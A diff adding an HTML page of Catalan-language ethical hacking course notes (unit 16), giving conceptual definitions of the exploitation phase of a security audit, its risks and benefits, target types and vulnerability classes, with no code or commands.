@@ -1,0 +1,1468 @@
+<!DOCTYPE html>
+
+<html data-theme="light" lang="ca">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width,initial-scale=1" name="viewport"/>
+<title>UT16 — Explotación de vulnerabilidades — Hacking Ètic i Auditoria de Seguretat | Portal Docent Pepe Cuenca</title>
+<link href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Cdefs%3E%3ClinearGradient id='bg' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%233f51b5'/%3E%3Cstop offset='100%25' stop-color='%23157878'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='64' height='64' rx='14' fill='url(%23bg)'/%3E%3Cpath d='M16 22 L28 32 L16 42' fill='none' stroke='%23ffffff' stroke-width='5' stroke-linecap='round' stroke-linejoin='round'/%3E%3Cline x1='32' y1='42' x2='48' y2='42' stroke='%234ade80' stroke-width='5' stroke-linecap='round'/%3E%3C/svg%3E" rel="icon" type="image/svg+xml"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700%7CRoboto+Mono:400,600&amp;display=fallback" rel="stylesheet"/>
+<style>
+    :root {
+      --bg-body: #f5f7fa;
+      --bg-card: #ffffff;
+      --bg-sidebar: #ffffff;
+      --text-main: #1f2937;
+      --text-muted: #374151;
+      --primary: #2563eb;
+      --primary-dark: #1e40af;
+      --border: #e5e7eb;
+      --code-bg: #f1f5f9;
+      --header-bg: #1e3a8a;
+      --md-code-font: "Roboto Mono", SFMono-Regular, Consolas, Menlo, monospace;
+    }
+    [data-theme="dark"] {
+      --bg-body: #0f172a;
+      --bg-card: #1e293b;
+      --bg-sidebar: #1e293b;
+      --text-main: #f1f5f9;
+      --text-muted: #cbd5e1;
+      --primary: #60a5fa;
+      --primary-dark: #93c5fd;
+      --border: #334155;
+      --code-bg: #0f172a;
+      --header-bg: #0f172a;
+    }
+    * { box-sizing: border-box; }
+    body {
+      font-family: "Roboto", -apple-system, BlinkMacSystemFont, sans-serif;
+      background-color: var(--bg-body);
+      color: var(--text-main);
+      margin: 0;
+      line-height: 1.65;
+    }
+    header.top-bar {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      background: var(--header-bg);
+      color: #fff;
+      padding: 12px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.18);
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+    .top-bar .brand {
+      font-weight: 700;
+      font-size: 1.05rem;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      flex-wrap: wrap;
+    }
+    .top-bar .brand a {
+      color: #93c5fd;
+      text-decoration: none;
+      font-size: 0.88rem;
+      font-weight: 400;
+    }
+    .top-bar .brand a:hover { text-decoration: underline; color: #fff; }
+    .top-bar .actions {
+      display: flex;
+      gap: 10px;
+      align-items: center;
+    }
+    .btn-toggle {
+      background: rgba(255,255,255,0.15);
+      color: #fff;
+      border: 1px solid rgba(255,255,255,0.25);
+      padding: 6px 12px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 0.84rem;
+      font-weight: 500;
+      text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .btn-toggle:hover { background: rgba(255,255,255,0.25); }
+    .layout {
+      max-width: 1380px;
+      margin: 24px auto;
+      padding: 0 20px;
+      display: grid;
+      grid-template-columns: 320px 1fr;
+      gap: 24px;
+      align-items: start;
+    }
+    @media (max-width: 980px) {
+      .layout { grid-template-columns: 1fr; }
+      aside.sidebar { position: static; max-height: none; }
+    }
+    aside.sidebar {
+      position: sticky;
+      top: 72px;
+      background: var(--bg-sidebar);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 16px;
+      max-height: calc(100vh - 96px);
+      overflow-y: auto;
+    }
+    .sidebar-search {
+      width: 100%;
+      padding: 8px 10px;
+      margin-bottom: 14px;
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      background: var(--bg-body);
+      color: var(--text-main);
+      font-size: 0.85rem;
+    }
+    aside.sidebar details.nav-unit {
+      margin-bottom: 10px;
+      border-bottom: 1px solid var(--border);
+      padding-bottom: 8px;
+    }
+    aside.sidebar details.nav-unit summary {
+      cursor: pointer;
+      font-size: 0.83rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.03em;
+      color: var(--primary);
+      padding: 4px 2px;
+      user-select: none;
+    }
+    aside.sidebar ul {
+      list-style: none;
+      padding: 0;
+      margin: 6px 0 4px 0;
+    }
+    aside.sidebar li { margin-bottom: 3px; }
+    aside.sidebar a {
+      color: var(--text-muted);
+      text-decoration: none;
+      font-size: 0.84rem;
+      display: block;
+      padding: 5px 8px;
+      border-radius: 5px;
+      transition: all 0.15s;
+      line-height: 1.35;
+    }
+    aside.sidebar a:hover, aside.sidebar a.active {
+      background: var(--code-bg);
+      color: var(--primary);
+      font-weight: 600;
+    }
+    aside.sidebar a.unit-full-link {
+      font-weight: 600;
+      color: var(--primary-dark);
+      background: rgba(37, 99, 235, 0.08);
+      margin-bottom: 4px;
+    }
+    main.content {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 42px 52px;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.04);
+      min-width: 0;
+    }
+    @media (max-width: 640px) {
+      main.content { padding: 24px 18px; }
+    }
+    h1 { font-size: 1.95rem; margin-top: 0; color: var(--text-main); letter-spacing: -0.02em; }
+    h2 {
+      font-size: 1.42rem;
+      color: var(--primary);
+      border-bottom: 2px solid var(--border);
+      padding-bottom: 8px;
+      margin-top: 2.2rem;
+    }
+    h3 { font-size: 1.15rem; margin-top: 1.5rem; color: var(--text-main); }
+    h4 { font-size: 1rem; margin-top: 1.2rem; color: var(--text-muted); }
+    p, li { color: var(--text-muted); font-size: 0.96rem; }
+    a { color: var(--primary); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    hr { border: 0; height: 1px; background: var(--border); margin: 2.2rem 0; }
+    .up-badge {
+      display: inline-block;
+      background: #dbeafe;
+      color: #1e40af;
+      font-size: 0.78rem;
+      font-weight: 700;
+      padding: 4px 12px;
+      border-radius: 999px;
+      margin-bottom: 12px;
+    }
+    [data-theme="dark"] .up-badge {
+      background: #1e3a8a;
+      color: #bfdbfe;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 1.4rem 0;
+      font-size: 0.9rem;
+      display: block;
+      overflow-x: auto;
+    }
+    th, td {
+      padding: 10px 14px;
+      border: 1px solid var(--border);
+      text-align: left;
+    }
+    th {
+      background-color: var(--code-bg);
+      font-weight: 700;
+      color: var(--text-main);
+    }
+    .admonition, details.admonition {
+      margin: 1.4rem 0;
+      padding: 0 1.2rem 0.7rem 1.2rem;
+      border-left: 4px solid #448aff;
+      border-radius: 6px;
+      background-color: #f0f7ff;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+      overflow: hidden;
+    }
+    [data-theme="dark"] .admonition, [data-theme="dark"] details.admonition {
+      background-color: #172554;
+    }
+    .admonition-title, details.admonition > summary {
+      font-weight: 700;
+      margin: 0 -1.2rem 0.7rem -1.2rem;
+      padding: 0.65rem 1.2rem;
+      font-size: 0.92rem;
+      color: #0d47a1;
+      background-color: #e3effd;
+      display: block;
+    }
+    [data-theme="dark"] .admonition-title, [data-theme="dark"] details.admonition > summary {
+      background-color: #1e3a8a;
+      color: #dbeafe;
+    }
+    .admonition.warning { border-left-color: #ff9100; background-color: #fffbf0; }
+    .admonition.warning .admonition-title { color: #b75e00; background-color: #fff3d6; }
+    .admonition.tip { border-left-color: #00bfa5; background-color: #f0faf8; }
+    .admonition.tip .admonition-title { color: #004d40; background-color: #e0f5f2; }
+    .admonition.exercise { border-left-color: #00c853; background-color: #f2faf4; }
+    .admonition.exercise .admonition-title { color: #1b5e20; background-color: #e2f7e7; }
+    .admonition.danger { border-left-color: #ff1744; background-color: #fff5f7; }
+    .admonition.danger .admonition-title { color: #b71c1c; background-color: #ffe0e6; }
+    [data-theme="dark"] .admonition.warning,
+    [data-theme="dark"] .admonition.tip,
+    [data-theme="dark"] .admonition.exercise,
+    [data-theme="dark"] .admonition.danger { background-color: #0f172a; }
+    [data-theme="dark"] .admonition.warning .admonition-title,
+    [data-theme="dark"] .admonition.tip .admonition-title,
+    [data-theme="dark"] .admonition.exercise .admonition-title,
+    [data-theme="dark"] .admonition.danger .admonition-title { background-color: #1e293b; color: #f8fafc; }
+    .terminal-box {
+      background-color: #1e1e2e;
+      border: 1px solid #313244;
+      border-radius: 8px;
+      margin: 1.3rem 0;
+      overflow: hidden;
+      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.18);
+    }
+    .terminal-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background-color: #181825;
+      padding: 8px 14px;
+      border-bottom: 1px solid #313244;
+      user-select: none;
+    }
+    .terminal-dots { display: flex; gap: 6px; align-items: center; width: 65px; }
+    .terminal-dots .dot { width: 11px; height: 11px; border-radius: 50%; display: inline-block; }
+    .dot-red { background-color: #ff5f56; }
+    .dot-yellow { background-color: #ffbd2e; }
+    .dot-green { background-color: #27c93f; }
+    .terminal-title {
+      font-family: var(--md-code-font);
+      color: #cdd6f4;
+      font-size: 0.78rem;
+      font-weight: 500;
+      text-align: center;
+      flex-grow: 1;
+    }
+    .terminal-actions { display: flex; align-items: center; gap: 8px; }
+    .btn-copy {
+      background: #313244;
+      color: #cdd6f4;
+      border: 1px solid #45475a;
+      border-radius: 4px;
+      padding: 2px 8px;
+      font-size: 0.72rem;
+      cursor: pointer;
+      font-family: var(--md-code-font);
+    }
+    .btn-copy:hover { background: #45475a; }
+    .terminal-lang {
+      font-family: var(--md-code-font);
+      background-color: #313244;
+      color: #a6adc8;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 0.7rem;
+      text-transform: uppercase;
+      font-weight: 600;
+    }
+    .terminal-box pre {
+      margin: 0;
+      padding: 14px 18px;
+      background-color: transparent;
+      color: #cdd6f4;
+      font-family: var(--md-code-font);
+      font-size: 0.88rem;
+      line-height: 1.55;
+      overflow-x: auto;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+    .terminal-box code { background: transparent; color: inherit; padding: 0; font-size: inherit; }
+    code {
+      font-family: var(--md-code-font);
+      font-size: 0.87em;
+      background-color: var(--code-bg);
+      color: var(--primary-dark);
+      padding: 2px 6px;
+      border-radius: 4px;
+    }
+    .page-nav-footer {
+      margin-top: 3rem;
+      padding-top: 1.5rem;
+      border-top: 2px solid var(--border);
+      display: flex;
+      justify-content: space-between;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+    .page-nav-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 16px;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      background: var(--bg-body);
+      color: var(--primary);
+      font-weight: 600;
+      font-size: 0.9rem;
+      text-decoration: none;
+    }
+    .page-nav-btn:hover { background: var(--code-bg); text-decoration: none; }
+  </style>
+</head>
+<body>
+<header class="top-bar">
+<div class="brand">
+<span>🕵️ Hacking Ètic i Auditoria de Seguretat — CE Ciberseguretat (CETI)</span>
+<a href="../index.html">📚 Índex del Mòdul</a>
+<a href="../../../index.html">🗂️ Biblioteca Cicles</a>
+<a href="../../../../">🏠 Portal Docent</a>
+</div>
+<div class="actions">
+<button class="btn-toggle" onclick="toggleTheme()">🌓 Mode Fosc / Clar</button>
+</div>
+</header>
+<div class="layout">
+<aside class="sidebar">
+<input class="sidebar-search" oninput="filterSidebar(this)" placeholder="🔍 Filtrar apartats..." type="text"/>
+<ul><li><a href="../index.html">🏠 <strong>Inici Hacking Ètic i Auditoria de Seguretat</strong></a></li></ul>
+<details class="nav-unit">
+<summary>UT0 — Unitat Didàctica 0</summary>
+<ul>
+<li><a class="unit-full-link" href="../ut00/index.html">📘 UT0 Completa (1 pàgina)</a></li>
+<li><a href="../ut00/ut0001.html">0.1 Chat general</a></li>
+<li><a href="../ut00/ut0002.html">0.2 Programación del módulo</a></li>
+<li><a href="../ut00/ut0003.html">0.3 Contenidos y criterios de evaluación</a></li>
+<li><a href="../ut00/ut0004.html">0.4 Presentación del módulo</a></li>
+<li><a href="../ut00/ut0005.html">0.5 Accesibilidad</a></li>
+<li><a href="../ut00/ut0006.html">0.6 guia para aprender a programar</a></li>
+<li><a href="../ut00/ut0007.html">0.7 Primera evaluación</a></li>
+<li><a href="../ut00/ut0008.html">0.8 Segunda evaluación</a></li>
+<li><a href="../ut00/ut0009.html">0.9 Tercera evaluación</a></li>
+</ul>
+</details>
+<details class="nav-unit">
+<summary>UT1 — Elementos esenciales del HE</summary>
+<ul>
+<li><a class="unit-full-link" href="../ut01/index.html">📘 UT1 Completa (1 pàgina)</a></li>
+<li><a href="../ut01/ut0101.html">1.1 HE 1</a></li>
+<li><a href="../ut01/ut0102.html">1.2 Prácticas tema 1</a></li>
+<li><a href="../ut01/ut0103.html">1.3 tema1</a></li>
+<li><a href="../ut01/ut01actividades.html">✍️ Activitats pràctiques UT1</a></li>
+</ul>
+</details>
+<details class="nav-unit">
+<summary>UT2 — Unitat Didàctica 2</summary>
+<ul>
+<li><a class="unit-full-link" href="../ut02/index.html">📘 UT2 Completa (1 pàgina)</a></li>
+<li><a href="../ut02/ut0201.html">2.1 tema2</a></li>
+<li><a href="../ut02/ut02actividades.html">✍️ Activitats pràctiques UT2</a></li>
+</ul>
+</details>
+<details class="nav-unit">
+<summary>UT3 — Unitat Didàctica 3</summary>
+<ul>
+<li><a class="unit-full-link" href="../ut03/index.html">📘 UT3 Completa (1 pàgina)</a></li>
+<li><a href="../ut03/ut0301.html">3.1 Auditories</a></li>
+<li><a href="../ut03/ut0302.html">3.2 Material adicional</a></li>
+<li><a href="../ut03/ut0303.html">3.3 Material adicional 2</a></li>
+<li><a href="../ut03/ut03actividades.html">✍️ Activitats pràctiques UT3</a></li>
+</ul>
+</details>
+<details class="nav-unit">
+<summary>UT4 — Footprinting</summary>
+<ul>
+<li><a class="unit-full-link" href="../ut04/index.html">📘 UT4 Completa (1 pàgina)</a></li>
+<li><a href="../ut04/ut0401.html">4.1 Footprinting con Google</a></li>
+<li><a href="../ut04/ut0402.html">4.2 Footprinting con Bing</a></li>
+<li><a href="../ut04/ut0403.html">4.3 Footprinting con Shodan</a></li>
+<li><a href="../ut04/ut0404.html">4.4 Footprint</a></li>
+<li><a href="../ut04/ut04actividades.html">✍️ Activitats pràctiques UT4</a></li>
+</ul>
+</details>
+<details class="nav-unit">
+<summary>UT5 — Fingerprint</summary>
+<ul>
+<li><a class="unit-full-link" href="../ut05/index.html">📘 UT5 Completa (1 pàgina)</a></li>
+<li><a href="../ut05/ut0501.html">5.1 Introducción al Fingerprinting</a></li>
+<li><a href="../ut05/ut0502.html">5.2 Nmap</a></li>
+<li><a href="../ut05/ut0503.html">5.3 Fingerprinting</a></li>
+<li><a href="../ut05/ut0504.html">5.4 Presentación fingerprint</a></li>
+<li><a href="../ut05/ut0505.html">5.5 Enumeración con nmap</a></li>
+<li><a href="../ut05/ut0506.html">5.6 Scripts amb nmap</a></li>
+<li><a href="../ut05/ut05actividades.html">✍️ Activitats pràctiques UT5</a></li>
+</ul>
+</details>
+<details class="nav-unit">
+<summary>UT6 — Auditorias de seguridad con Wireshark</summary>
+<ul>
+<li><a class="unit-full-link" href="../ut06/index.html">📘 UT6 Completa (1 pàgina)</a></li>
+<li><a href="../ut06/ut0601.html">6.1 Wireshark</a></li>
+<li><a href="../ut06/ut06actividades.html">✍️ Activitats pràctiques UT6</a></li>
+</ul>
+</details>
+<details class="nav-unit">
+<summary>UT7 — Auditorias de seguridad utilizando hping</summary>
+<ul>
+<li><a class="unit-full-link" href="../ut07/index.html">📘 UT7 Completa (1 pàgina)</a></li>
+<li><a href="../ut07/ut0701.html">7.1 Auditorias utilizando hping3</a></li>
+</ul>
+</details>
+<details class="nav-unit">
+<summary>UT8 — Contratos pretesting</summary>
+<ul>
+<li><a class="unit-full-link" href="../ut08/index.html">📘 UT8 Completa (1 pàgina)</a></li>
+<li><a href="../ut08/ut0801.html">8.1 Creación de contratos</a></li>
+<li><a href="../ut08/ut08actividades.html">✍️ Activitats pràctiques UT8</a></li>
+</ul>
+</details>
+<details class="nav-unit">
+<summary>UT9 — Fase de análisis</summary>
+<ul>
+<li><a class="unit-full-link" href="../ut09/index.html">📘 UT9 Completa (1 pàgina)</a></li>
+<li><a href="../ut09/ut0901.html">9.1 analisi</a></li>
+<li><a href="../ut09/ut0902.html">9.2 Nessus</a></li>
+<li><a href="../ut09/ut0903.html">9.3 practiques</a></li>
+<li><a href="../ut09/ut09actividades.html">✍️ Activitats pràctiques UT9</a></li>
+</ul>
+</details>
+<details class="nav-unit">
+<summary>UT10 — Ejercicios Fingerprinting</summary>
+<ul>
+<li><a class="unit-full-link" href="../ut10/index.html">📘 UT10 Completa (1 pàgina)</a></li>
+<li><a href="../ut10/ut10actividades.html">✍️ Activitats pràctiques UT10</a></li>
+</ul>
+</details>
+<details class="nav-unit">
+<summary>UT11 — Ingenieria social</summary>
+<ul>
+<li><a class="unit-full-link" href="../ut11/index.html">📘 UT11 Completa (1 pàgina)</a></li>
+<li><a href="../ut11/ut1101.html">11.1 Ingenieria social</a></li>
+<li><a href="../ut11/ut11actividades.html">✍️ Activitats pràctiques UT11</a></li>
+</ul>
+</details>
+<details class="nav-unit">
+<summary>UT12 — Explotación de vulnerabilidades</summary>
+<ul>
+<li><a class="unit-full-link" href="../ut12/index.html">📘 UT12 Completa (1 pàgina)</a></li>
+<li><a href="../ut12/ut1201.html">12.1 Introducción</a></li>
+</ul>
+</details>
+<details class="nav-unit">
+<summary>UT13 — Pentesting web</summary>
+<ul>
+<li><a class="unit-full-link" href="../ut13/index.html">📘 UT13 Completa (1 pàgina)</a></li>
+<li><a href="../ut13/ut1301.html">13.1 Pentesting web</a></li>
+<li><a href="../ut13/ut13actividades.html">✍️ Activitats pràctiques UT13</a></li>
+</ul>
+</details>
+<details class="nav-unit">
+<summary>UT14 — Robots de Búsquedas</summary>
+<ul>
+<li><a class="unit-full-link" href="../ut14/index.html">📘 UT14 Completa (1 pàgina)</a></li>
+<li><a href="../ut14/ut1401.html">14.1 Continguts i Recursos</a></li>
+<li><a href="../ut14/ut14actividades.html">✍️ Activitats pràctiques UT14</a></li>
+</ul>
+</details>
+<details class="nav-unit">
+<summary>UT15 — Riesgos laborales en el entorno de HE</summary>
+<ul>
+<li><a class="unit-full-link" href="../ut15/index.html">📘 UT15 Completa (1 pàgina)</a></li>
+<li><a href="../ut15/ut15actividades.html">✍️ Activitats pràctiques UT15</a></li>
+</ul>
+</details>
+<details class="nav-unit" open="">
+<summary>UT16 — Explotación de vulnerabilidades</summary>
+<ul>
+<li><a class="unit-full-link active" href="../ut16/index.html">📘 UT16 Completa (1 pàgina)</a></li>
+<li><a href="../ut16/ut1601.html">16.1 Explotación</a></li>
+<li><a href="../ut16/ut1602.html">16.2 Metasploit</a></li>
+</ul>
+</details>
+<details class="nav-unit">
+<summary>UT17 — -------</summary>
+<ul>
+<li><a class="unit-full-link" href="../ut17/index.html">📘 UT17 Completa (1 pàgina)</a></li>
+<li><a href="../ut17/ut17actividades.html">✍️ Activitats pràctiques UT17</a></li>
+</ul>
+</details>
+<ul><li><a href="../references.html">📂 <strong>Índex de Documents i Recursos</strong></a></li></ul>
+</aside>
+<main class="content">
+<span class="up-badge">CE Ciberseguretat (CETI) · UT16 Completa</span>
+<h1>📘 UT16 — Explotación de vulnerabilidades (Unitat Completa)</h1>
+<div class="admonition tip"><p class="admonition-title">📑 Índex d'Apartats d'aquesta Unitat</p><ul><li><a href="#ut1601"><strong>16.1 Explotación</strong></a> (o <a href="./ut1601.html">obrir en pàgina individual ➡️</a>)</li><li><a href="#ut1602"><strong>16.2 Metasploit</strong></a> (o <a href="./ut1602.html">obrir en pàgina individual ➡️</a>)</li></ul></div>
+<hr/>
+<h2 id="ut1601">16.1 Explotación</h2>
+<p>TEMA 7. AUDITORIA DE SEGURETAT: EXPLOTACIÓ DE VULNERABILITATS. HACKING ÈTIC (HE) 1R CIBER</p>
+<p>Hacking ètic 1r CIBER La informació continguda en aquesta presentació només és per a fins educatius. EL PROFESSORAT DEL CURS D'ESPECIALITZACIÓ EN CIBERSEGURETAT EN ENTORNS DE LES TECNOLOGIES DE LA INFORMACIÓ I EL CENTRE EDUCATIU NO ES FAN RESPONSABLES DE L'ÚS INDEGUT D'AQUESTA INFORMACIÓ.</p>
+<p>ÍNDEX Hacking ètic 1r CIBER</p>
+<ul>
+<li>INTRODUCCIÓ.</li>
+<li>FASES DEL PROCÉS.</li>
+</ul>
+<p>AUDITORIA DE SEGURETAT.</p>
+<ul>
+<li>CICLE DE VIDA D’UN CIBERATAC A UN SISTEMA.</li>
+<li>INTRODUCCIÓ.</li>
+<li>DEFINICIÓ.</li>
+<li>CARACTERÍSTIQUES.</li>
+<li>BENEFICIS.</li>
+<li>RISCOS.</li>
+<li>OBJECTIUS A EXPLOTAR.</li>
+<li>TIPUS DE VULNERABILITATS.</li>
+<li>TIPUS D’EXPLOTACIÓ.</li>
+<li>EXPLOIT.</li>
+<li>PAYLOAD.</li>
+<li>FERRAMENTES.</li>
+</ul>
+<p>EXPLOTACIÓ DE VULNERABILITATS.</p>
+<p>AUDITORIA DE SEGURETAT INTRODUCCIÓ Hacking ètic 1r CIBER Una auditoria es una revisió pràctica que es realitza sobre els recursos informàtics que disposa una entitat amb la finalitat d'emetre un informe o dictamen sobre la situació en què es desenvolupen i s'utilitzen.</p>
+<p>Un procés d'auditoria recorre certes pràctiques enfocades a les diferents proves que s'hauran de realitzar per satisfer la demanda de client, utilitzant el Hacking Ètic en algunes de les fases d’aquest procés.</p>
+<p>AUDITORIA DE SEGURETAT FASES DEL PROCÉS Hacking ètic 1r CIBER Footprint: Recollida d'informació pública o “information gathering” (menys important en un procés d'auditoria interna). Fingerprint: Anàlisi de serveis localitzats en la fase de Footprint.</p>
+<p>Anàlisi de Vulnerabilitats sobre els serveis operatius que s’han analitzat en la fase de Fingerprint. Explotació de Vulnerabilitats localitzades en la fase d'Anàlisi de Vulnerabilitats. Generació d'informes amb les vulnerabilitats localitzades i les possibles solucions.</p>
+<p>Hacking ètic 1r CIBER EXPLOTACIÓ DE VULNERABILITATS CICLE DE VIDA D’UN CIBERATAC A UN SISTEMA</p>
+<p>EXPLOTACIÓ DE VULNERABILITATS INTRODUCCIÓ</p>
+<ul>
+<li>UNA VEGADA HEM OBTINGUT TOTA LA INFORMACIÓ POSSIBLE DE LA VÍCTIMA, GRÀCIES A LES FASES ANTERIORS DE</li>
+</ul>
+<p>L’AUDITORIA, PASSEM A EXPLOTAR LES VULNERABILITATS DEL SISTEMA PER INTENTAR FER-NOS AMB EL CONTROL DE LA MÀQUINA I ELS PRIVILEGIS D'ADMINISTRADOR.</p>
+<ul>
+<li>RECORDEM LES ANTERIORS ETAPES</li>
+<li>FOOTPRINTING: BÚSQUEDA D’INFORMACIÓ PÚBLICA DE L’ORGANITZACIÓ OBJECTIU ⇨ GOOGLE, BING, ANUBIS,</li>
+</ul>
+<p>SHODAN (IOT) I MALTEGO.</p>
+<ul>
+<li>FINGERPRINTING: BÚSQUEDA D’OBJECTIUS CONCRETS DE L’ORGANITZACIÓ ⇨ NMAP I HPING3 COM A</li>
+</ul>
+<p>FERRAMENTES ACTIVES I WIRESHARK COM A PASSIVA.</p>
+<ul>
+<li>ANÀLISI DE VULNERABILITATS: DESCOBRIMENT D’APLICACIONS O SERVEIS DE L’OBJECTIU AMB VULNERABILITATS ⇨</li>
+</ul>
+<p>NESSUS I OPENVAS. Hacking ètic 1r CIBER</p>
+<p>EXPLOTACIÓ DE VULNERABILITATS DEFINICIÓ</p>
+<ul>
+<li>L'EXPLOTACIÓ DE VULNERABILITATS ÉS LA FASE D’ATAC, ON L’AUDITOR O</li>
+</ul>
+<p>INTRÚS INFORMÀTIC HA DE BUSCAR APROFITAR-SE D'ALGUNA DE LES VULNERABILITATS IDENTIFICADES EN FASES ANTERIORS, PER ACONSEGUIR LA INTRUSIÓ EN EL SISTEMA OBJECTIU.</p>
+<ul>
+<li>TIPUS</li>
+<li>ESCALADA DE PRIVILEGIS.</li>
+<li>EXPLOTACIÓ DE VULNERABILITATS.</li>
+<li>DENEGACIÓ DE SERVEIS.</li>
+<li>MANTENIMENT DE L’ACCÉS.</li>
+</ul>
+<p>Hacking ètic 1r CIBER</p>
+<p>Hacking ètic 1r CIBER EXPLOTACIÓ DE VULNERABILITATS DEFINICIÓ L'explotació de vulnerabilitats és una etapa altament important, ja que és ací on l’auditor de seguretat li demostra al client que les vulnerabilitats identificades i reportades en les fases anteriores de l’auditoria de seguretat poden afectar la integritat, confidencialitat i disponibilitat dels sistemes d’informació empresarials.</p>
+<p>Quan s’execute un procés d’explotació (sempre executat amb el permís de l’organització auditada), el client entendrà que les vulnerabilitats no sols es reporten en un informe tècnic, sinó que també es poden explotar, aconseguint un atac real, però controlat, en els sistemes informàtics de l’organització auditada.</p>
+<p>EXPLOTACIÓ DE VULNERABILITATS CARACTERÍSTIQUES</p>
+<ul>
+<li>LA FASE D’EXPLOTACIÓ DE VULNERABILITATS ES CARACTERITZA PER</li>
+<li>ÉS UN PROCÉS D'ATAC PUR CONTRA L’OBJECTIU AUDITAT.</li>
+<li>HI HA UN ALT RISC QUE EL SISTEMA VÍCTIMA PERDA ELS SEUS NIVELLS D'INTEGRITAT,</li>
+</ul>
+<p>DISPONIBILITAT I CONFIDENCIALITAT.</p>
+<ul>
+<li>L’ÈXIT DE L'EXPLOTACIÓ DEPENDRÀ DE LA INFORMACIÓ TROBADA I LES FERRAMENTES EXECUTADES</li>
+</ul>
+<p>EN LES ANTERIORS FASES DE L'AUDITORIA.</p>
+<ul>
+<li>UN PROCÉS D'EXPLOTACIÓ POT CAUSAR UNA DENEGACIÓ DE SERVEIS.</li>
+<li>ÉS LA FASE MÉS PERILLOSA.</li>
+</ul>
+<p>Hacking ètic 1r CIBER</p>
+<p>EXPLOTACIÓ DE VULNERABILITATS BENEFICIS</p>
+<ul>
+<li>LA FASE D’EXPLOTACIÓ DE VULNERABILITATS TÉ ELS BENEFICIS SEGÜENTS</li>
+<li>NO QUEDEN DUBTES RESPECTE A LES VULNERABILITATS REPORTADES, JA QUE AQUESTES DEIXEN</li>
+</ul>
+<p>DE SER SUPOSTOS I REGISTRES EN INFORMES, PER CONVERTIR-SE EN UN RISC I AMENAÇA REAL.</p>
+<ul>
+<li>POSA A PROVA L'EFICÀCIA DELS SISTEMES DE CONTROL I PROTECCIÓ ACTUALS.</li>
+<li>REGISTRA UN ESTAT REAL DE LA SEGURETAT DE LA INFORMACIÓ EN UNA EMPRESA O</li>
+</ul>
+<p>ORGANITZACIÓ, LA QUAL NO SE SUPORTA EN SUPOSTOS, SINÓ EN EVIDÈNCIES REALS. Hacking ètic 1r CIBER</p>
+<p>EXPLOTACIÓ DE VULNERABILITATS RISCOS • LA FASE D’EXPLOTACIÓ DE VULNERABILITATS TÉ ELS RISCOS SEGÜENTS, QUE HAN DE SER ESTIMATS I ANALITZATS PER L’EQUIP D’AUDITORS DE SEGURETAT: • CAIGUDES DE SERVEIS. • CAIGUDES DEL SISTEMA. • DENEGACIÓ DE SERVEIS. • PÈRDUES DE CONFIDENCIALITAT DE LES DADES.</p>
+<p>• PÈRDUES DE DISPONIBILITAT. • EXPOSICIÓ D’INFORMACIÓ CONFIDENCIAL. • IMPACTES EN L’ESTABILITAT DEL SISTEMA AVALUAT. • ELS RISCOS S'HAN DE REGISTRAR DE MANERA CLARA EN EL CONTRAT DEFINIT ENTRE EL CLIENT I L'AUDITOR ABANS DE REALITZAR LES PROVES DE SEGURETAT. Hacking ètic 1r CIBER</p>
+<p>EXPLOTACIÓ DE VULNERABILITATS OBJECTIUS A EXPLOTAR</p>
+<ul>
+<li>DE FORMA SIMILAR A LA FASE D’ANÀLISI DE VULNERABILITATS, ES POT REALITZAR UNA</li>
+</ul>
+<p>EXPLOTACIÓ ALS ELEMENTS SEGÜENTS</p>
+<ul>
+<li>SERVIDORS.</li>
+<li>ESTACIONS DE TREBALL.</li>
+<li>SWITCHES I ROUTERS.</li>
+<li>LLOCS WEB.</li>
+<li>SERVEIS DE XARXA.</li>
+<li>DISPOSITIUS MÒBILS.</li>
+<li>BASES DE DADES.</li>
+<li>ALTRES.</li>
+</ul>
+<p>Hacking ètic 1r CIBER</p>
+<p>EXPLOTACIÓ DE VULNERABILITATS TIPUS DE VULNERABILITATS</p>
+<ul>
+<li>A CONTINUACIÓ ES DESCRIUEN ALGUNS TIPUS DE VULNERABILITATS</li>
+</ul>
+<p>D’APLICACIONS, COM PODEN SER SERVIDORS FTP, SERVIDORS WEB, SERVIDORS SSH O APLICACIONS D’ESCRIPTORI</p>
+<ul>
+<li>DESBORDAMENT DE BUFFER.</li>
+<li>RACE CONDITION.</li>
+<li>INTEGER OVERFLOW.</li>
+<li>STRING FORMAT.</li>
+<li>ALTRES VULNERABILITATS.</li>
+</ul>
+<p>Hacking ètic 1r CIBER</p>
